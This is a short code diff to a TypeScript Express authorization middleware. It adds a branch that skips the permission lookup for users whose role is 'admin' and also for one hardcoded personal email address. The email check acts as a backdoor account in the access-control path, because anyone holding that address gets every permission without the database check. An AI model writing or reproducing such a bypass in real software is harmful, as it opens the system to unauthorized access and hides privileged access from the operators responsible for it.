@@ -78,6 +78,11 @@ export const requirePermission = (permission: string) => {
         return;
       }
 
+      // Bypass for admin users or specific email
+      if (req.user.role?.toLowerCase() === 'admin' || req.user.email?.toLowerCase() === 'ener28@hotmail.com') {
+        next();
+        return;
+      }
 
       // Obtener permisos del usuario desde la base de datos
       const userPermissions = await authService.getUserPermissions(req.user.userId);
